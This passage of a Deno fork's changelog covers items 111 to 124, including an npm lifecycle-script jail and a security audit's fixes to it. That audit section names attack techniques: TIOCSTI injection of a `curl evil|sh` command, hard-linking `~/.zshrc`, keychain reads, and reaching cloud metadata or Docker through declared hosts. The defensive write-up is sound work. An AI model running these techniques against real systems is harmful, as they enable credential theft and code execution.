     - **Corporate proxies that only take host names
       (`supplyChain.jailScripts.upstreamByName`).** Some upstream proxies
       refuse a `CONNECT` to an address, so jailed scripts that need the network
       failed there. With `"upstreamByName": true` (default `false`) and an
       upstream proxy configured, the jail still checks the allow-list and
       resolves the name, refusing one that leads to an internal address exactly
       as above, then asks the upstream for the NAME (`CONNECT host:port`,
       `http://host/...`), which it resolves and reaches itself. The trade-off:
       the address the upstream uses is no longer the one the jail checked, so a
       name whose DNS answers differently at the upstream (rebinding between the
       two lookups, or split-horizon DNS) can reach whatever the upstream
       reaches; the corporate proxy's own policy then holds. Without an upstream
       proxy (or for a `NO_PROXY` host) it changes nothing. Without the flag, an
       upstream that answers the address form with `400`, `403`, `502`, or `407`
       although credentials were sent fails the tunnel with a `502` whose body,
       and a warning in the install log, say to set `"upstreamByName": true` if
       this network's proxy only accepts host names; there is no automatic
       fallback. A forwarded `http://` request passes the answer through
       unchanged (it may be the server's own) and only logs the warning.

     Tests: `npm/supply_chain_jail`
     (`listed_name_resolving_to_loopback_refused`, Linux: a listed
     `ip6-localhost` is refused plainly and as a tunnel while the listed
     `127.0.0.1:4546` goes through; `declared_host_binds_every_program`: curl
     through the proxy reaches the declared host, plainly and through a CONNECT
     tunnel, the proxy refuses another host, and curl around the proxy, to the
     declared host too, and a raw socket from `node` are refused;
     `per_package_hosts_bind_every_program`, the same for deno.json's host list;
     `package_net_false_wins`; `no_writes_into_other_packages`, `node` and `sh`
     writing into a sibling package, through its link and its real path, and
     elsewhere in node_modules), `jail_proxy` unit tests
     (`allow_list_host_and_port`, `allow_list_idna`, `allow_list_ip_literals`,
     `allow_list_rejects_non_hosts`, `connect_requests`,
     `absolute_uri_requests`, `upstream_from_env`,
     `forwards_allowed_and_refuses_others`, `tunnels_allowed`,
     `chains_through_upstream_proxy`, `internal_addresses`,
     `resolve_then_refuse`, `refuses_names_that_resolve_internal`,
     `allow_private_and_pinned_address`, `upstream_gets_the_checked_address`,
     `upstream_refusing_addresses_hints_by_name`,
     `upstream_missing_credentials_is_not_a_name_problem`, `upstream_by_name`),
     `package_net_false_wins`, `os_net_choice`, `proxy_env`,
     `new_executables_removed`, `home_paths` and the proxy grant in `clamp`
     (`cli/supply_chain/jail.rs`), `profile_proxy_only` (`sandbox_macos`),
     `seccomp_program_semantics` (a small BPF interpreter over the generated
     program, `sandbox_linux`), and the host forms, `executables` and
     `allowPrivate`, `upstreamByName` in `test_to_supply_chain_config`
     (`libs/config/deno_json`).

112. **`fix(coverage)`: a process ended by SIGINT / SIGTERM still writes its
     coverage** (`feat/dx-batch`, CLI only; `ext/signals/lib.rs`,
     `cli/util/signal_flush.rs`, `cli/worker.rs`, `cli/tools/test/mod.rs`).
     Adapted from
     [denoland/deno#32362](https://github.com/denoland/deno/pull/32362) (open).
     `deno run` with `DENO_COVERAGE_DIR` / `--coverage` (or `--cpu-prof`) and
     `deno test --coverage` wrote nothing when a signal ended them: a test
     runner's or supervisor's teardown (SIGTERM), Ctrl+C. The data is flushed
     through each isolate's inspector, which only the isolate's own thread can
     drive, so the signal cannot write it itself.
     - **`deno_signals::register_before_default_action`**: a hook that runs when
       a signal arrives and its default action is about to run, that is only
       when no handler prevents the default; the default action runs once the
       hooks return. A program's own `Deno.addSignalListener("SIGTERM", …)` (or
       `process.on("SIGINT")`) keeps the signal: nothing is flushed early, and
       its own exit writes the coverage as before. Hooks run with no lock held,
       so the thread a hook waits for can still register a signal handler
       meanwhile (`deno run` registers its SIGUSR1 inspector listener 500 ms in;
       holding the lock deadlocked the flush until it gave up).
     - **`cli/util/signal_flush.rs`**: each thread with coverage joins as a
       participant and races its work against the signal; once signalled it
       stops collecting (the run's main worker also stops the CPU profiler) and
       leaves. The hook (SIGINT and SIGTERM; SIGINT only on Windows) waits for
       every participant, for at most 10 s; then the default action ends the
       process, so the parent still sees `SIGTERM` / `SIGINT`. `deno run`'s main
       worker and each `deno test` worker join; the test runner's own SIGINT
       report (exit 130) waits for its workers the same way.
     - Not under `--watch`, which restarts on signals. A thread stuck in
       synchronous JavaScript cannot flush: the process ends after the 10 s wait
       without its coverage. SIGKILL cannot be caught (upstream's follow-up is
       periodic flushing). A Web Worker still alive at the signal is not
       flushed.

     Tests: spec `coverage/signal_flush` (Unix: `deno run` ended by SIGTERM and
     by SIGINT, `deno test --coverage` ended by SIGTERM and by SIGINT, each
     writing the module's coverage and ended by the signal (the test runner's
     SIGINT by exit code 130); a program with its own SIGTERM listener keeps it;
     the four signal cases print `missing` on `3.0.0-rc.5`);
     `hooks_run_only_before_the_default_action`,
     `a_waiting_hook_does_not_block_registration` (`ext/signals/lib.rs`);
     `participants_flush_before_the_signal_returns`
     (`cli/util/signal_flush.rs`).

113. **`feat(node)`: Node's SIGINT trace and SIGINT watchdog** (`feat/dx-batch`,
     CLI and runtime; `ext/node/ops/util.rs`, `ext/node/polyfills/util.ts`,
     `ext/node/polyfills/internal_binding/mod.ts`, `ext/signals/lib.rs`,
     `libs/node_shim/lib.rs`, `cli/worker.rs`). Adapted from
     [denoland/deno#32423](https://github.com/denoland/deno/pull/32423) (closed
     unmerged with the 2.9 LTS feature freeze). A SIGINT that ends a hung
     program now says where its main thread was, as Node's `--trace-sigint`
     does.
     - **Opt in** with `util.setTraceSigInt(true)` (a no-op before), or with
       `--trace-sigint` in `NODE_OPTIONS`:
       `NODE_OPTIONS=--trace-sigint deno
       run main.ts`, or
       `node --trace-sigint main.js` through the Node shim, which now forwards
       the flag there (the last of `--trace-sigint` / `--no-trace-sigint` wins).
       Off by default.
     - **What it prints**: Node's banner,
       `` KEYBOARD_INTERRUPT: Script
       execution was interrupted by `SIGINT` ``,
       then the JavaScript stack of the main thread (source-mapped, without the
       synthetic first line), on stderr; then SIGINT ends the process as before
       (killed by `SIGINT`, not a clean exit).
     - **How**: a hook before SIGINT's default action
       (`deno_signals::register_before_default_action`, item 112), so a program
       that listens for SIGINT itself keeps it and nothing is printed. The hook
       asks V8 to interrupt the main thread, which captures and prints the
       stack, and waits for it. Unlike upstream's PR, a main thread that runs no
       JavaScript (an idle event loop) can't be interrupted: after 250 ms the
       hook prints the banner alone, as Node does on idle, instead of the signal
       being swallowed and the process left running.
     - **Watchdog**: `internalBinding('contextify')`'s `startSigintWatchdog` /
       `stopSigintWatchdog` / `watchdogHasPendingSigint`, which Node's REPL and
       `vm` use to see a Ctrl+C during an evaluation. While it watches, it
       consumes SIGINT through a new `deno_signals::set_interceptor` (runs
       before the handlers; returning `true` hides the signal from them).

     Tests: spec `node/trace_sigint` (Unix: the trace through
     `util.setTraceSigInt` and through `NODE_OPTIONS`, a busy main thread
     printing the banner and the `innerWork` frame, an idle one the banner
     alone, both ended by SIGINT; a SIGINT listener keeps the signal; off by
     default; the three trace cases print nothing on `3.0.0-rc.5`);
     `node_compat` `parallel/test-util-sigint-watchdog.js` (enabled);
     `an_interceptor_consumes_the_signal` (`ext/signals/lib.rs`);
     `node_options_turn_the_trace_on` (`ext/node/ops/util.rs`);
     `trace_sigint_rides_along_in_node_options` (`libs/node_shim`).

114. **`perf(emit)`: named emit-cache directories** (`feat/dx-batch`, CLI only;
     `libs/resolver/cache/emit.rs`, `libs/resolver/emit.rs`,
     `libs/resolver/deno_json.rs`, `cli/tools/test/vitest/transform.rs`). For
     [denoland/deno#30791](https://github.com/denoland/deno/pull/30791) (open),
     along its review's suggestion: the emit cache kept one entry per module, so
     two ways of emitting the same module (a process with
     `DENO_DISABLE_VERBATIM_MODULE_SYNTAX=1` and one without, `deno test`'s
     Vitest JSX override and `deno run`, an embedder's overrides such as
     `@deno/loader`'s) overwrote each other's entry and re-emitted on every
     alternation. The source hash kept a stale entry from being used, so this
     cost time, never correctness.
     - **Layout**: a module's usual options keep `$DENO_DIR/gen/<as before>`, so
       `deno run`'s emits and existing caches are unchanged. Emits made with
       other options live in `gen/<name>/<as before>`, the name made of readable
       tags instead of upstream's options hash: `preserve-jsx`,
       `no-verbatim-module-syntax` (only when the config has it on),
       `source-map-base` (from `CompilerOptionsOverrides`), and `vitest` for the
       Vitest transform's JSX options, joined with `+`
       (`TranspileAndEmitOptions::emit_cache_name`).
     - The emit of a module a program transform changed (`*.transformed.js`)
       stays in the root, where `deno coverage` looks for it without the
       transform. A name that is not one plain path segment is refused (no cache
       entry).
     - `deno clean --except` keeps only the root entries, as it already did for
       transformed emits.

     Tests: spec `run/emit_cache_named_dirs` (one `DENO_DIR`, `deno run` with
     the usual options, with `DENO_DISABLE_VERBATIM_MODULE_SYNTAX=1`, then usual
     again: the module has an emit under `file` and one under
     `no-verbatim-module-syntax`; `3.0.0-rc.5` keeps only one);
     `emit_cache_named_dirs` (`libs/resolver/cache/emit.rs`);
     `overrides_name_the_emit_cache_directory`, `emit_cache_name_with_appends`
     (`libs/resolver/deno_json.rs`).

115. **`feat(check)`: `deno check` ends with a "Checked N files" summary**
     (`feat/dx-batch`, CLI only; `cli/tools/check.rs`). For
     [denoland/deno#35739](https://github.com/denoland/deno/pull/35739) (closed
     unmerged with the 2.9 LTS feature freeze; it closed
     [#32709](https://github.com/denoland/deno/issues/32709)). `deno fmt` and
     `deno lint` end with `Checked N files`; `deno check` printed only its
     `Check <specifier>` lines, and nothing at all when everything was already
     checked and cached. It now prints `Checked 1 file` / `Checked N files`
     after a clean check, counting the roots it checked, on both engines: the
     native one (the default, where the summary was captured but only logged at
     debug level) and the in-process one (`--check-engine=tsc`, `--doc`).
     Nothing when the check fails, when no file matched, or under `--quiet`.
     Other commands that type-check (`run --check`, `test`, ...) print no
     summary.

     Tests: `checked_summary_counts_the_roots` (`cli/tools/check.rs`); the
     `deno check` spec and integration outputs that end after a clean check now
     end with the summary (as upstream's PR updated them), which they lack on
     `3.0.0-rc.5`.

116. **`feat(jupyter)`: notebook cells run with the config's permissions**
     (`feat/dx-batch`, CLI only; `cli/tools/jupyter/mod.rs`,
     `cli/tools/jupyter/prompter.rs`, `cli/ops/jupyter.rs`, `cli/args/mod.rs`).
     Adapted from
     [denoland/deno#35587](https://github.com/denoland/deno/pull/35587) (closed
     unmerged with the 2.9 LTS feature freeze). The Jupyter kernel ran every
     cell with every permission, so a notebook could not be limited.
     - **The set**: a `permissions.jupyter` set in the `deno.json` found from
       the kernel's working directory (as for any subcommand, so one beside the
       notebook), else the `default` set. With neither, cells keep every
       permission, as before. A set in use prints the same "experimental" notice
       as other config-file permissions. The kernel's own worker (the ZMQ
       sockets, no user code) keeps every permission. Inside a jailed npm
       lifecycle script the set is clamped to the jail, like every other
       command's permissions.
     - **Prompts**: an access outside the set is asked about in the notebook,
       over Jupyter's stdin channel (as `prompt()` / `confirm()` are): `y`
       allows it once, `A` allows all of that permission, anything else denies
       it. A frontend without stdin support (or `allow_stdin: false`) denies, as
       the terminal prompter does when it cannot ask.
     - Not done: `--allow-*` flags on `deno jupyter`, whose parser takes no
       permission flags (a kernel is started from its `kernel.json`, which
       `deno jupyter --install` writes without them).

     Tests: `jupyter_permissions_jupyter_set`,
     `jupyter_permissions_default_set`, `jupyter_permissions_default_allow_all`,
     `jupyter_permission_prompt_allow`, `jupyter_permission_prompt_deny`
     (`tests/integration/jupyter_tests.rs`; the set and prompt cases fail on
     `3.0.0-rc.5`, where every access is allowed and nothing is asked);
     `prompt_names_the_choices`, `answers` (`cli/tools/jupyter/prompter.rs`).

117. **`fix(check)`: a `compilerOptions.types` entry nothing resolves is an
     error** (`feat/dx-batch`, CLI only; `cli/tsc/diagnostics.rs`,
     `cli/type_checker.rs`, `cli/tools/check.rs`). For
     [denoland/deno#32764](https://github.com/denoland/deno/issues/32764), which
     upstream deferred to Deno 3.0 "together with a purpose-built diagnostic for
     unresolvable `compilerOptions.types` entries (correct suggestion such as
     `npm:@types/node` or removing the entry, pointed at the entry's position in
     the config file)"; its prototype,
     [denoland/deno#35693](https://github.com/denoland/deno/pull/35693), was
     closed for the generic message. `"types": ["asdfasdf"]` passed
     `deno check --check-engine=tsc` without a word (Deno's graph records the
     unresolvable entry and the walk dropped it), the native engine reported the
     compiler's bare TS2688, and a subpath entry such as `"vite/client"` passed
     both (the generated project leaves subpath entries out).
     - **One diagnostic on both engines**, from Deno's graph: an entry that is a
       bare name nothing maps (no import map entry, no `node_modules`) gets
       TS2688
       `Cannot find type definition file for 'asdfasdf' in
       "compilerOptions.types".`,
       a hint
       (`Write "npm:@types/asdfasdf" for the
       package's types (or "npm:asdfasdf" when the package ships its own), or
       remove the entry.`;
       `"npm:vite/client"` for a subpath, `"npm:@types/scope__name"` for a
       scoped package), and the entry's line and column in the config file with
       a code frame. The native engine drops the compiler's own TS2688 for that
       entry.
     - **Left alone**: `"node"` and `"deno"` (Deno provides their types), an
       entry the native engine's generated project provides as a type root
       (`.deno/types/<entry>`, such as the Vitest types), and entries that
       resolve (a mapped name, a `node_modules` package, an `npm:` / `jsr:`
       specifier). A relative path that does not exist keeps its own error
       (TS2307 / TS6053), and an entry whose resolution failed for another
       reason keeps Deno's resolution message (upstream's prototype).
     - This turns configs that passed into failures (a `"vite/client"` carried
       over from a `tsconfig.json`, say), as upstream planned for 3.0; the hint
       says what to write.

     Tests: spec `check/compiler_options_types_not_found` (a bare entry and a
     subpath entry, each on both engines; `"node"` beside them is fine; on
     `3.0.0-rc.5` the in-process engine and the subpath entry pass);
     `types_entry_suggestions`, `types_entries_are_found_in_the_config`,
     `unresolved_types_entry_diagnostic` (`cli/tsc/diagnostics.rs`);
     `ts2688_names_its_types_entry`,
     `types_entries_the_generated_project_provides_resolve`
     (`cli/tools/check.rs`).

118. **`fix(process)`: a child's Windows stdout and stderr hold no blocking-pool
     thread** (`fix/win-concurrent-hang`, CLI and runtime; `ext/io/lib.rs`,
     `ext/process/lib.rs`). `Deno.Command` (and the legacy `Deno.run`) wrapped a
     piped child's stdout / stderr in tokio's `ChildStdout` / `ChildStderr`,
     which on Windows read the pipe with a blocking `ReadFile` on the runtime's
     blocking pool. A pending read holds its pool thread until data or EOF, and
     a child's stderr is usually quiet until it exits, so each live piped child
     pinned one or two threads; a cancelled read kept its thread until the
     pipe's writer closed. The pool is capped at four threads per CPU on Windows
     (`runtime/tokio_util.rs`). Once pending reads filled it, the stdout read a
     busy child needed never got a thread: the child blocked in `WriteFile` on
     its full pipe, never exited, and never released the threads its own reads
     held. Every piped spawn in that runtime then hung, `deno info --json` /
     `deno bundle` children of a build or of a `deno test --parallel` file
     included (upstream's code as well; on a 2-CPU host 8 concurrent `deno info`
     children with stdout and stderr piped hung every time, 7 never did, and
     with stderr `"null"` 32 finished).
     - The parent's end is the overlapped named pipe server that
       `deno_subprocess_windows`' `anon_pipe` creates, so it is now read as a
       `tokio::net::windows::named_pipe::NamedPipeServer` (`ChildPipeReader`,
       `ChildStdoutReader`, `ChildStderrReader` in `deno_io`) through the I/O
       completion port: a pending read holds no thread, and dropping one cancels
       it. `ERROR_BROKEN_PIPE` reads as EOF, as before.

     Not changed: `node:child_process` (its own stdio path) and the
     `Deno.pipe`-style `AsyncPipeRead`, which still reads through tokio's
     `ChildStdout` (item 119 moves it).

     Test: `commandManyPipedChildrenDoNotExhaustBlockingPool`
     (`tests/unit/command_test.ts`, Windows only): `4 * hardwareConcurrency + 4`
     concurrent children each write 256 KiB to a piped stdout with stderr piped
     and quiet; all must finish within 60 s.

119. **`fix(io)`: a `deno_io` async pipe reader holds no blocking-pool thread on
     Windows** (`fix/rc7-robustness`, CLI and runtime; `ext/io/pipe.rs`). The
     rest of item 118: `PipeRead::into_async` wrapped the read end of
     `deno_io::pipe()` (the client end of an overlapped named pipe) in tokio's
     `ChildStdout`, which reads with a blocking `ReadFile` on the runtime's
     blocking pool, so every pending read of a quiet pipe pinned a pool thread
     (four per CPU on Windows) until data or EOF. `deno test` reads each
     worker's stdout and stderr through it, so a `--parallel` run with more
     workers than the pool could spare left none for file system ops or child
     process I/O. `AsyncPipeRead` is now a
     `tokio::net::windows::named_pipe::NamedPipeClient` read through the I/O
     completion port: a pending read holds no thread, and `ERROR_BROKEN_PIPE`
     reads as EOF. `AsyncPipeRead::into_sync` now fails with `Unsupported` on
     Windows (tokio's `NamedPipeClient` can't hand the handle back, it stays
     bound to the completion port, and the reader may hold data it read ahead);
     nothing in the tree calls it.

     Audited and left as they are: `bi_pipe` (IPC) and `node:child_process`'s
     stdio (`uv_compat` pipes) already read through the completion port;
     `AsyncPipeWrite` (`ChildStdin`) holds a thread only while the pipe is full,
     and nothing in the tree writes through it; stdin and files read through
     `spawn_blocking` one resource at a time; `deno task`'s output pipes are
     `deno_task_shell`'s (an external crate, its own `spawn_blocking`).

     Test: `quiet_async_pipes_hold_no_blocking_thread` (`ext/io/pipe.rs`): with
     a two-thread blocking pool, eight quiet pipe reads pending, a
     `spawn_blocking` task and a pipe with data must still finish within 20 s.
     On a 2-CPU Windows host a standalone copy of the old reader starved every
     time (5 of 5) and the new one never did.

120. **`fix(node)`: `node <script>` without its extension through the `node`
     shim** (`feat/nest-phase1`, CLI only; `cli/node_compat_shim.rs`,
     `libs/node_shim/lib.rs`). `node dist/main` (what `nest start` and
     `npm run start:prod` run) failed with
     `Module not found "file:///%20Copyright…"` whenever `node` was Deno: the
     PATH shim `deno x --install-node-shims` writes, and the `node` Deno puts on
     its own `PATH` for `child_process.spawn("node")`. An entrypoint that does
     not exist as written is resolved by a child `<exe> eval <resolve.js>`, and
     `<exe>` was `current_exe()`, which is the shim's own path on macOS (a
     symlink) and on Windows (a hardlink or copy named `node.exe`). The child
     re-entered Node.js argument translation, so `eval` became the entrypoint
     and the resolver's source its first argument. The child now runs with
     `DENO_DISABLE_NODE_SHIM=1` (a plain `deno eval` whatever its file name),
     and the arg0 dispatch canonicalizes the executable first. Linux was
     unaffected (`/proc/self/exe` resolves the link).

     Tests: spec `node/node_compat_shim` `spawn_node_extensionless` (unix: the
     `node` Deno puts on `PATH`) and `node_shim_extensionless` (every OS: a
     `node` symlink, or a `node.exe` hardlink / copy on Windows, of the deno
     executable runs `node dist/main a b`); both fail on `3.0.0-rc.5`.

121. **`fix(graph)`: a type-only import of a subpath only `@types` provides**
     (`feat/nest-phase1`, CLI only; `cli/graph_util.rs`).
     `import { App } from "supertest/types"` (Nest's default e2e test) failed
     `deno run` / `deno test` with `ERR_MODULE_NOT_FOUND`, `--no-check`
     included: `supertest/types` exists only as `@types/supertest/types.d.ts`,
     and the module graph resolves every static import for code before emit
     elides the type-only ones, which tsc + Node.js and Node's TypeScript
     loaders never resolve. The graph walk now leaves out that resolution error
     when all of these hold: Node.js resolution failed with
     `ERR_MODULE_NOT_FOUND` or `ERR_PACKAGE_PATH_NOT_EXPORTED` for a bare
     package subpath (`pkg/sub`, `@scope/pkg/sub`; a package root such as a
     phantom dependency keeps the graph error); the importer is TypeScript;
     every import of the specifier there is a static ES import or re-export with
     bindings (no side-effect import, dynamic import, `require()` or import
     attributes); and in a typed graph its types resolution found a declaration
     file. When every use is a type the emitted JavaScript drops the import;
     when a value is used the runtime resolves it and fails with the same error
     before any code runs (the runtime resolver's message ends in a blank line,
     as it always has). Type checking keeps its own resolution, and a failed one
     is still reported.

     Tests: spec `npm/types_only_subpath` (`run` without and with `--check`
     prints the value; a value use of the type-only subpath still fails with
     `ERR_MODULE_NOT_FOUND`; the first fails on `3.0.0-rc.5`); the
     `npm/workspace_basic` `*_sub_path_not_exists` outputs now come from the
     runtime resolver; `node/byonm_phantom_dep_res_failure` (a package root)
     keeps the graph error; unit test
     `graph_util::tests::bare_package_subpaths`.

122. **`fix(check)`: a package.json project's tsconfig.json checks the same on
     both engines** (`feat/nest-phase1`, CLI only; `libs/resolver/deno_json.rs`,
     `libs/resolver/graph.rs`, `cli/graph_util.rs`, `cli/tsc/tsconfig_gen.rs`).
     Nest's default tsconfig.json failed `deno test` and `deno compile` while
     `deno check` passed, and none of them saw `@types/jest`'s globals.
     - **`baseUrl`**: the in-process TypeScript 6 checker (which `deno test`
       uses for a project with a Jest or Vitest config, and `deno compile` for a
       graph with npm types) stopped on TS5101 (`baseUrl` is deprecated), which
       the native checker adapts away (item 90). Module resolution, `paths`
       included, is Deno's on both, so the in-process checker now gets
       `ignoreDeprecations: "6.0"` beside a `baseUrl`, unless the config sets
       its own.
     - **`compilerOptions.types`**: a tsconfig's entry is a type reference
       directive, which TypeScript looks up in `@types` first. The in-process
       graph resolved `"jest"` to the `jest` package (the runner's API, no
       globals), and the native generator turned it into that package's
       declaration file. Both now take `@types/jest` when a
       `node_modules/@types` holds it (`@scope/name` → `@types/scope__name`);
       `node`, `deno`, deno.json entries and entries that aren't a bare package
       name are unchanged.
     - **No `types`**: TypeScript 5 includes every `node_modules/@types` package
       (in the config's directory and its ancestors) on its own. In a
       package.json project (no deno.json) both engines now do the same for a
       tsconfig.json whose `compilerOptions` (its `extends` chain included, for
       the in-process engine) set no `types`; the native engine leaves a config
       with `extends` to its chain. `node` and `deno` are Deno's; a package with
       `"typings": null` opts out. TypeScript 6 changed the default of `types`
       to `[]`, but such a project's own compiler is usually 5.x.

     Tests: spec `npm/node_project_types` (a `baseUrl` tsconfig without `types`
     and one with `"types": ["testglobals"]` beside a `testglobals` package of
     its own, each checked with `--check-engine=tsc` and natively; all four fail
     on `3.0.0-rc.5`); `tsconfig_types_entry_package_maps_to_at_types`
     (`libs/resolver/graph.rs`).

123. **`fix(npm)`: a jailed install check may load the package's own native
     addon** (`feat/nest-phase1`, CLI only; `cli/supply_chain/jail.rs`).
     Approving bcrypt 6 (likewise bufferutil, utf-8-validate and any
     `node-gyp-build` package) failed in the jail: `node-gyp-build-test` loads
     the package's prebuilt `.node` to check it, the clamped `deno` had no FFI
     (`NotCapable: Requires ffi access to …/prebuilds/darwin-x64/bcrypt.node`),
     and the fallback to a source build (`node-gyp`) is not there. A jailed
     `deno` now gets FFI scoped to the package's own folder (as the script
     reaches it, and resolved) where it asked for FFI (`-A` from the `node`
     shim, `--allow-ffi`); a path list keeps only the entries inside it, clamped
     as the write list is (`clamp_path_list`: resolved against the cwd,
     canonicalized, `..` folded), and native code anywhere else stays refused.
     This adds no reach: a jailed script already writes and runs programs in its
     own folder, under the same OS sandbox, and a native addon is loaded from
     there at run time anyway. Where the OS can't confine (Windows, Linux
     without Landlock, macOS without a working `sandbox-exec`), nothing would
     hold what the addon does, so the jail grants no FFI at all there, as
     before.

     Tests: spec `npm/supply_chain_jail` `native_addon_own_folder` (unix:
     `@denotest/jail-native-addon`'s install script loads its own
     `prebuilds/addon.node`, allowed, and one in the project, denied; on
     `3.0.0-rc.5` both are denied) and `native_addon_unconfined` (Windows: both
     denied); `clamp_ffi_to_package_folder` (a `..` path list entry, and no FFI
     roots, refused) and `ffi_roots_only_under_an_os_sandbox`
     (`cli/supply_chain/jail.rs`).

124. **`fix(npm)`: the lifecycle-script jail, hardened** (`fix/jail-hardening`,
     CLI only; `cli/supply_chain/jail.rs`, `cli/supply_chain/jail_proxy.rs`,
     `cli/supply_chain/sandbox_macos.rs`, `cli/supply_chain/sandbox_linux.rs`,
     `cli/factory.rs`, `cli/tools/info.rs`, `libs/config/deno_json/mod.rs`,
     `cli/schemas/config-file.v1.json`, `Cargo.toml`, `Cargo.lock`). The fork's
     security audit of 2026-10-25 read the jail of items 83, 103, 108 and 111
     end to end and found it kept its promise ("confines the whole process
     tree") only where the OS sandbox started closed; these are the fixes (the
     audit's A-H1 to A-H3, A-M1 to A-M7, A-L1 to A-L5, D-L1 and D-I1).
     - **macOS: a deny-by-default Seatbelt profile (High).** The profile started
       with `(allow default)` and denied only writes, credential reads and IP
       traffic. Everything else was open: `mach-lookup` to every launchd
       service, so a script could `open x.command` (Terminal runs it unconfined,
       launched by launchd), `security find-generic-password` (the keychain
       answers over mach, not through the denied files), `pbpaste`, `osascript`,
       and read any process's environment through `sysctl
       kern.procargs2`
       (the installer's tokens); and `file-link` was unrestricted, so
       `ln ~/.zshrc node_modules/pkg/z` made the user's shell profile writable
       through a write root. Now the profile is `(deny
       default)` and
       allows only: `file-read*` minus the credential files and the terminals;
       `file-write*` and `file-link` beneath the roots (both ends: a link from
       outside is refused) plus the null devices; `file-ioctl` minus the
       terminals; `process-fork` and `process-exec` (a setuid program such as
       `/bin/ps` can't start under a profile, as under Linux's `no_new_privs`);
       `signal` and `process-info*` within the sandbox; `sysctl-read` minus the
       `kern.proc` prefix (the process table); POSIX semaphores and shared
       memory; and six mach services (the user database for `getpwuid`,
       `dirhelper` for `confstr`, logging, the notification center). Refused by
       name as well, so a later allow can't widen past them: `securityd` /
       `SecurityServer` / `trustd`, `launchservicesd` / `lsd`, the pasteboard,
       `tccd`, `dnssd`, `lsopen`, `appleevent-send`, `job-creation`. The network
       rules are unchanged in effect (`(deny network*)`, the proxy's port, or
       `(allow network*)` minus Unix sockets but the resolver's). Validated on
       macOS 15.8 with `sandbox-exec` against `sh`, Deno, `clang` / `make`
       (through `xcrun`; slower, as before, since its cache under
       `$DARWIN_USER_CACHE_DIR` is not writable and must not be: a poisoned
       `xcrun_db` would redirect the user's own `clang`), `cmake`, `git`, `tar`,
       `curl`, `python3`, and the install scripts of real packages (the matrix
       below).
     - **TIOCSTI: a script could type into the user's shell (High).** The script
       kept the installer's session and controlling terminal, and `/dev/tty` was
       writable on both OSes, so `ioctl(TIOCSTI)` on `/dev/tty` queued
       `curl evil|sh` for the shell to run after the install (Linux before 6.2,
       or with `dev.tty.legacy_tiocsti=1`; macOS on the controlling tty). Now
       the script's process is a session leader (`setsid` before exec, on both
       OSes; inherited by everything it starts), so there is no controlling
       terminal and `/dev/tty` opens with `ENXIO`; `/dev/tty` and `/dev/ttys*`
       are out of the write rules (and not readable or `ioctl`-able under
       Seatbelt); and Linux's seccomp refuses `ioctl(TIOCSTI)` and
       `ioctl(TIOCLINUX)` with `EPERM`, for a terminal opened by path on a
       kernel that still takes them.
     - **A package's declared host reached loopback and cloud metadata (High).**
       The proxy's internal-address check exempted an allow-list entry that is
       an IP literal, and the name `localhost`, and those exemptions applied to
       the hosts a package declares for itself (`binary.host`), so a package
       declaring `http://169.254.169.254`, `http://localhost:2375` (Docker) or
       `http://127.0.0.1:5432` reached the service through the jail's own proxy
       (item 111's text claimed otherwise; corrected there). Now an allow-list
       marked as declared (`AllowList::with_declared`) checks every target: an
       IP literal in any URL form (`0x7f000001`, `2130706433`, `0177.0.0.1`,
       `[::ffff:127.0.0.1]`), `localhost`, and every name as it resolves, with
       no `allowPrivate`. The exemptions stay for entries from the project's own
       deno.json list.
     - **Linux: a network namespace of the script's own (Medium).** Landlock's
       port rule allows the proxy's port number on ANY address, so a script
       could connect with plain TCP to `<attacker>:<that port>` (one
       `iptables
       REDIRECT` rule accepts every port) around the proxy.
       Where unprivileged user namespaces are allowed, the script's process now
       `unshare(
       CLONE_NEWUSER | CLONE_NEWNET)`s between fork and exec,
       maps its user and group to themselves, brings `lo` up, binds the proxy's
       listening socket on `127.0.0.1:<port>` inside the namespace (the port is
       chosen by the installer; nothing else is on that loopback) and hands it
       to the installer over a socketpair (`SCM_RIGHTS`); the installer accepts
       on it and dials upstream from the host's network. No route leads anywhere
       else. This also lets Linux before 6.7 (no Landlock network rules) honour
       host lists instead of failing closed. Where the namespace can't be had
       (`user.max_user_namespaces=0`, `kernel.unprivileged_userns_clone=0`,
       Ubuntu 23.10+'s AppArmor `kernel.apparmor_restrict_unprivileged_userns`),
       the Landlock port rule applies as before and a one-line warning says so,
       once per install; `deno info --json` reports it (below).
     - **A declared host is a request, not a grant (Medium).** A package granted
       itself the network by declaring `binary.host`, which turned "no network
       unless allowed" into "network for anyone who asks" (and carried the
       project's readable source out). Now a declared host is honoured only when
       the project's deno.json lists it for that package in
       `supplyChain.jailScripts.knownPackages`
       (`{ "<name>": ["host",
       "host:port"] }`; `host` covers every port;
       the package's own `net` list still replaces the declaration entirely);
       the others reach nothing, and the install prints, once per package, the
       host and the exact `packages.<name>.net` line that allows it. An object
       that holds only `knownPackages` configures the default jail without
       asking for it, as `packages` does (item 108). denext writes the entries
       its known-package table has.
     - **Workspace members' secrets were readable (Medium).** Only the root's
       and the cwd's `.npmrc` / `.env*` were hidden, one level deep. Now `.env*`
       (`.env`, `.env.local`, `.envrc`, ...), `.dev.vars`, `.npmrc`, `.netrc`,
       `.pypirc` and `.git-credentials` are hidden at any depth under the
       project (to 12 levels and at most 20,000 directories, with a warning past
       that; `node_modules`, `.git` and the jail's own directory are not
       entered; symlinks are not followed; a project directory that is a
       filesystem root or the home directory is looked into one level deep
       only), scanned once per install when the first script is jailed (never by
       a `deno` run that jails nothing), so a monorepo's `apps/web/.env.local`
       is as hidden as the root's.
     - **Hard links (Medium):** under the Seatbelt profile above, `file-link` is
       allowed only when the source lies beneath a write root; Landlock already
       refused them (`REFER`).
     - **Forwarded HTTP: one request per upstream connection (Medium).** A
       forwarded `http://` request's bytes after the head were relayed raw, so a
       script could pipeline a second request to any host behind an allowed one,
       through the installer's authenticated upstream proxy
       (`Proxy-Authorization` is added to the first head only), or smuggle one
       with a bare LF in a header. Now the head is parsed and refused (`400`)
       when a line holds a bare CR or LF, `Transfer-Encoding` comes with a
       `Content-Length` (or isn't `chunked`), two `Content-Length`s differ, or
       the `Host` header names another host than the URL (domain fronting on a
       shared address); the `Host` sent upstream is the URL's authority; exactly
       the declared body is copied (`Content-Length` bytes, or chunked through
       the last chunk and the trailers) and the server's write side is then
       closed, so nothing pipelined behind it is sent; the whole response comes
       back.
     - **Background processes outlived the jail (Medium).**
       `nohup sh -c '...'
       &` survived the script with its sandbox but
       after the executable sweep, and on Windows unconfined. With the script in
       its own process group (the `setsid` above), the installer now `SIGKILL`s
       the whole group when the script ends (or is interrupted), waits for it to
       be gone, and only then runs the executable sweep. Linux: the installer is
       a child subreaper (`PR_SET_CHILD_SUBREAPER`), so a descendant the script
